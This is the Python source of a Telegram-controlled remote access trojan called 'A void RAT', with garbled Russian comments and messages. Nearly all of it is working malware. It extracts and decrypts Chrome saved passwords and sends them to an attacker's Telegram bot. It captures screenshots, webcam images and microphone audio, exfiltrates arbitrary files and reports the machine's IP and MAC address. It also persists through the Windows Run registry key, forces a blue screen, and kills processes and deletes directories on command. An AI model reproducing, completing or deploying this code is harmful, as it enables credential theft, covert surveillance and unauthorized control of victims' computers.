import telebot
import json
import cv2
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
from PIL import ImageGrab
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
import os
import requests
import datetime
import sounddevice as sd
import wavio
import subprocess
import wmi
import ctypes
import webbrowser
import platform


bot_Token = '&&&&&&&' #Token –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞
bot1_Token = '&&&&&&&' #Token –±–æ—Ç–∞ –∫–æ—Ç–æ—Ä–æ–º—É –±—É–¥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –ø–∞—Ä–æ–ª–∏
chat_id = '&&&&&&&&' #Chat id
bot = telebot.TeleBot(bot_Token)
bot1 = telebot.TeleBot(bot1_Token)

bot.send_message(chat_id, 'üåì<b>A void RAT</b>üåó', parse_mode='HTML')
bot.send_message(chat_id, '–ù–∞–ø–∏—à–∏—Ç–µ <b>/RAT</b> \n—á—Ç–æ –±—ã <b>—É–∑–Ω–∞—Ç—å</b> –∫–æ–º–∞–Ω–¥—ã', parse_mode='HTML')

@bot.message_handler(commands=['RAT', 'rat', 'Rat'])
def RAT(message):
    bot.send_message(chat_id, '---------‚öôÔ∏è–ö–æ–º–∞–Ω–¥—ã‚öôÔ∏è---------\n \n--------------------------------\n> /Passwords - –ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏ \n> /Screen - –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞ \n> /Webcam - –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã \n> /Audio - –ó–∞–ø–∏—Å—å –º–∏–∫—Ä—Ñ–æ–Ω–∞' +
                     '\n---------üîã–ü–∏—Ç–∞–Ω–∏–µüîã---------- \n> /PowerOff - –í—ã–∫–ª—é—á–∏—Ç—å –ø–∫ \n> /Reboot - –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –ø–∫' +
                     '\n--------üåì–ü—Ä–∏–∫–æ–ª—å—á–∏–∫–∏üåó------ \n> /BSoD - –°–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ \n> /Autorun - –î–æ–±–∞–≤–∏—Ç—å –≤ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ \n> /Remove - –£–¥–∞–ª–∏—Ç—å RAT' +
                     '\n----------üóÇ–§–∞–π–ª—ãüóÇ----------- \n> /Pwd - –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ç–µ–∫—É—â—é—é –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é\n> /Cd - –ü–æ–º–µ–Ω—è—Ç—å –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é\n> /Delete - –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª \n> /Download - –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª' +
                     '\n--------üíæ–ø—Ä–æ–≥—Ä–∞–º–º—ãüíæ-------- \n> /Tasklist - –°–ø–∏—Å–æ–∫ –ø—Ä–æ–≥—Ä–∞–º–º \n> /Taskkill - –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É' +
                     '\n----------üåòAboutüåí----------- \n> /Message - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ \n> /Open_url - –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É \n> /Open - –û—Ç–∫—Ä—ã—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É \n> /InfinityOpen - –û—Ç–∫—Ä—ã—Ç—å –¥–æ—Ö—É—è —Ä–∞–∑ \n> /Info - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ü–ö' +
                     '\n-------------------------------- \n \n--------------/About------------'
                     )

@bot.message_handler(commands=['Passwords', 'passwords'])
def passwords(message):
    def chrome_date_and_time(chrome_data):
        # Chrome_data format is 'year-month-date
        # hr:mins:seconds.milliseconds
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

    def fetching_encryption_key():
        # Local_computer_directory_path will look
        # like this below
        # C: => Users => <Your_Name> => AppData =>
        # Local => Google => Chrome => User Data =>
        # Local State
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State")

        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]

        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"

    def main():
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)

        # connecting to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()

        # 'logins' table has the data
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

        # iterate over all rows
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]

            if user_name or decrypted_password:
                bot1.send_message(chat_id, f"Main URL: {main_url}")
                bot1.send_message(chat_id, f"Login URL: {login_page_url}")
                bot1.send_message(chat_id, f"User name: {user_name}")
                bot1.send_message(chat_id, f"Decrypted Password: {decrypted_password}")

            else:
                continue

            if date_of_creation != 86400000000 and date_of_creation:
                bot1.send_message(chat_id, f"Creation date: {str(chrome_date_and_time(date_of_creation))}")

            if last_usuage != 86400000000 and last_usuage:
                bot1.send_message(chat_id, f"Last Used: {str(chrome_date_and_time(last_usuage))}")
            bot1.send_message(chat_id, "=" * 10)
        cursor.close()

        try:

            # trying to remove the copied db file as
            # well from local computer
            os.remove(filename)
        except:
            pass
    if __name__ == "__main__":
        main()
@bot.message_handler(commands=['screen', 'Screen']) # –ñ–¥—ë–º –∫–æ–º–∞–Ω–¥—ã
def send_screen(command) :
    bot.send_message(chat_id, "–ü–æ–¥–æ–∂–¥–∏—Ç–µ...") # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ "Wait..."
    screen = ImageGrab.grab() # –°–æ–∑–¥–∞—ë–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è —Ä–∞–≤–Ω–∞ –ø–æ–ª—É—á–µ–Ω–∏—é —Å–∫—Ä–∏–Ω—à–æ—Ç–∞
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –≤ –ø–∞–ø–∫—É AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') # –û–±–Ω–æ–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é
    files = {'photo': screen} # –°–æ–∑–¥–∞—ë–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ POST –∑–∞–ø—Ä–æ—Å–æ–º
    requests.post("https://api.telegram.org/bot" + bot_Token + "/sendPhoto?chat_id=" + chat_id , files=files) # –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å
@bot.message_handler(commands=['Webcam', 'webcam'])
def webcam(command):
    try:
        bot.send_message(chat_id, "–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ –ø–µ—Ä–≤–æ–π –∫–∞–º–µ—Ä–µ...")  # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ "Wait..."
        # –í–∫–ª—é—á–∞–µ–º –ø–µ—Ä–≤—É—é –∫–∞–º–µ—Ä—É
        cap = cv2.VideoCapture(0)
        # –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
        for i in range(30):
            cap.read()

        ret, frame = cap.read()

        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ —Ñ–∞–π–ª
        cv2.imwrite('cam.png', frame)

        bot.send_photo(chat_id, photo=open("cam.png", "rb"))
        # –û—Ç–∫–ª—é—á–∞–µ–º –∫–∞–º–µ—Ä—É
        cap.release()
    except:
        bot.send_message(chat_id, "–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫–æ –≤—Ç–æ—Ä–æ–π –∫–∞–º–µ—Ä–µ...")
        # –í–∫–ª—é—á–∞–µ–º –ø–µ—Ä–≤—É—é –∫–∞–º–µ—Ä—É
        cap = cv2.VideoCapture(1)
        # –î–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫
        for i in range(30):
            cap.read()

        ret, frame = cap.read()

        # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –≤ —Ñ–∞–π–ª
        cv2.imwrite('cam.png', frame)

        bot.send_photo(chat_id, photo=open("cam.png", "rb"))
        # –û—Ç–∫–ª—é—á–∞–µ–º –∫–∞–º–µ—Ä—É
        cap.release()
@bot.message_handler(commands=['Audio', 'audio'])
def audio(command):
    from scipy.io.wavfile import write
    fs = 44100  # –ß–∞—Å—Ç–æ—Ç–∞ –¥–∏—Å–∫—Ä–µ—Ç–∏–∑–∞—Ü–∏–∏
    seconds = 10  # –ü—Ä–æ–¥–æ–ª–∂–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∑–∞–ø–∏—Å–∏
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # –î–æ–∂–¥–∏—Ç–µ—Å—å –æ–∫–æ–Ω—á–∞–Ω–∏—è –∑–∞–ø–∏—Å–∏
    wavio.write("sound.wav", myrecording, fs, sampwidth=2)
    bot.send_audio(chat_id, audio=open(r"C:/void/code/sound.wav", 'rb'))
@bot.message_handler(commands=['PowerOff', 'Poweroff', 'poweroff'])
def poweroff(command):
    subprocess.run(['shutdown', '/s', '/t', '1'])
    bot.send_message(chat_id, "–ö–æ–º–ø—å—é—Ç–µ—Ä –≤—ã–∫–ª—é—á–∞–µ—Ç—Å—è...")
@bot.message_handler(commands=['Reboot', 'reboot'])
def Reboot(command):
    restart_command = "shutdown /r /t 00"
    os.system(restart_command)
@bot.message_handler(commands=['BSoD', 'bsod'])
def BSoD(command):
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        bot.send_message(id, "BSOD Successfull!")
    else:
        bot.send_message(id, "BSOD Failed...")
@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
    reestr_path = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
    SetValueEx(reestr_path, 'worm', 0, REG_SZ, path)
    CloseKey(reestr_path)
@bot.message_handler(commands=['Remove', 'remove'])
def remove(command):
    os.rmdir('C:\Void')
    bot.send_message(chat_id, 'RAT —É–¥–∞–ª—ë–Ω')
@bot.message_handler(commands=['Cd', 'cd'])
def CD(command):
    try:
        user_msg = "{0}".format(message.text)
        path2 = user_msg.split(" ")[1]  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è - –ø–∞–ø–∫–∞
        os.chdir(path2)  # –ú–µ–Ω—è–µ–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é
        bot.send_message(chat_id, "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –∏–∑–º–µ–Ω–µ–Ω–∞ –Ω–∞ " + path2)
    except:
        bot.send_message(chat_id, "–û—à–∏–±–∫–∞")
@bot.message_handler(commands=['pwd', 'Pwd']) # –î–ò–†–ï–ö–¢–û–†–ò–Ø
def pwd(command):
    directory = os.path.abspath(os.getcwd()) # –ü–æ–ª—É—á–∞–µ–º —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–∏–µ
    bot.send_message(chat_id, "–¢–µ–∫—É—â–∞—è –¥–µ—Ä–∏–∫—Ç–æ—Ä–∏—è: \n" + (str(directory))) # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
@bot.message_handler(commands = ["Delete", "delete"]) # –£–î–ê–õ–ò–¢–¨ –ü–ê–ü–ö–£
def delete_dir(message):
    try:
        user_msg = "{0}".format(message.text)
        path2del = user_msg.split(" ")[1]  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è - –∏–º—è –ø–∞–ø–∫–∞
        os.removedirs(path2del)  # –£–¥–∞–ª—è–µ–º –ø–∞–ø–∫—É
        bot.send_message(chat_id, "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è " + path2del + " —É–¥–∞–ª–µ–Ω–∞")
    except:
        bot.send_message(chat_id, "–û—à–∏–±–∫–∞")
@bot.message_handler(commands=["Download", "download"])  # –ó–ê–ì–†–£–ó–ö–ê –§–ê–ô–õ–ê
def download_file(message):
    try:
        user_msg = "{0}".format(message.text)
        docc = user_msg.split(" ")[1]  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è, –≤ –∫–æ—Ç–æ—Ä–æ–π —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è –∏–º—è —Ñ–∞–π–ª–∞
        doccc = {'document': open(docc, 'rb')}  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –¥–ª—è POST –∑–∞–ø—Ä–æ—Å–∞

        requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id, files=doccc)  # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∞–π–ª
    except:
        bot.send_message(chat_id, "–û—à–∏–±–∫–∞")
@bot.message_handler(commands=["Run", "run"])  # –ó–ê–ì–†–£–ó–ö–ê –§–ê–ô–õ–ê
def run(message):
    try:
        bot.send_message(chat_id, "–æ—Ç–∫—Ä—ã–≤–∞–µ–º...")
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        os.startfile(link1)
        bot.send_message(chat_id, "–æ—Ç–∫—Ä—ã–ª–∏!")
    except:
        bot.send_message(chat_id, "–û—à–∏–±–∫–∞")
@bot.message_handler(commands=["Tasklist","tasklist"])
def Tasklist(message):
    f = wmi.WMI()
    for process in f.Win32_Process():
        bot.send_message(chat_id, f"{process.ProcessId:<10} {process.Name} \n")
@bot.message_handler(commands=["Taskkill", "taskkill"]) # –ü–†–û–¶–ï–°–°–´
def kill_process(message):
    try:
        user_msg = "{0}".format(message.text)  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –≤ –∫–æ—Ç–æ—Ä–æ–π —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è —Å–æ–æ–±—â–µ–Ω–∏–µ
        subprocess.call("taskkill /IM " + user_msg.split(" ")[1])  # –£–±–∏–≤–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –ø–æ –∏–º–µ–Ω–∏
        bot.send_message(chat_id, "–ì–æ—Ç–æ–≤–æ!")
    except:
        bot.send_message(chat_id, "–æ—à–∏–±–∫–∞!")
@bot.message_handler(commands=["Message", "message"])
def Message(message):
    try:
        user_msg = "{0}".format(message.text)  # –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è –≤ –∫–æ—Ç–æ—Ä–æ–π —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è —Å–æ–æ–±—â–µ–Ω–∏–µ
        ctypes.windll.user32.MessageBoxW(0, user_msg.split(" ")[1], "ERROR", 1)
    except:
        bot.send_message(chat_id, "–æ—à–∏–±–∫–∞!")
@bot.message_handler(commands=["open_url", "Open_url"]) # –û–¢–ö–†–´–¢–¨ –°–°–´–õ–ö–£
def open_url(message):
    try:
        user_msg = "{0}".format(message.text)
        url = user_msg.split(" ")[1]  # –û–±—ä—è–≤–ª—è–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –≤ –∫–æ—Ç–æ—Ä–æ–π —Å–æ–¥–µ—Ä–∂–∏—Ç—Å—è url
        webbrowser.open_new_tab(url)  # –û—Ç–∫—Ä—ã–≤–∞–µ–º —Å—Å—ã–ª–∫—É
        bot.send_message(chat_id, "–ì–æ—Ç–æ–≤–æ!")
    except:
        bot.send_message(chat_id, "–æ—à–∏–±–∫–∞!")
@bot.message_handler(commands=['open', 'Open'])
def open(message):
    try:
        bot.send_message(chat_id, "–æ—Ç–∫—Ä—ã–≤–∞–µ–º...")
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        os.startfile(link1)
        bot.send_message(chat_id, "–æ—Ç–∫—Ä—ã–ª–∏!")
    except:
        bot.send_message(chat_id, "–æ—à–∏–±–∫–∞!")
@bot.message_handler(commands=["InfinityOpen", 'Infinityopen', 'infinityopen'])
def InfinityOpen(message):
    link = "{0}".format(message.text)
    link1 = link.split(" ")[1]
    open = os.startfile(link1)
    bot.send_message(chat_id, "–æ—Ç–∫—Ä—ã–ª–∏!")
    for open in range(999):
        link = "{0}".format(message.text)
        link1 = link.split(" ")[1]
        open = os.startfile(link1)
@bot.message_handler(commands=["Info", 'info'])
def Info(message):
    import uuid
    r = requests.get('http://ip.42.pl/raw')
    ip = r.text
    windows = platform.platform()  # –ü–æ–ª—É—á–∞–µ–º –≤–µ—Ä—Å–∏—é Windows
    processor = platform.processor()  # –ü–æ–ª—É—á–∞–µ–º —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞
    UserName = os.getlogin()
    bot.send_message(chat_id, "<b>–ò–º—è –ü–ö:</b> " + UserName + "\n<b>–í–∏–Ω–¥–æ–≤—Å:</b> " + windows + "\n<b>–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:</b> " + processor + "\n<b>Ip:</b> " + ip + "\n<b>MAC:</b> " + ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
for ele in range(0,8*6,8)][::-1]) , parse_mode='HTML')
@bot.message_handler(commands=["About", 'about'])
def About(message):
    bot.send_message(chat_id, "–ü—Ä–∏–≤–µ—Ç –º–æ–π –î—Ä—É–≥, —Ç—ã —Å–µ–π—á–∞—Å –ø–æ–ª—å–∑—É–µ—à—å—Å—è –º–æ–µ–π RAT –ø—Ä–æ–≥—Ä–∞–º–º–æ–π :) <b>\nName RAT: A void \nCoder: Ryodan \nRelease: 05.03.2023 \nLast update: 05.03.2023 \nVersion python: 3.11 \n14 y.o.</b>", parse_mode='HTML')
bot.polling()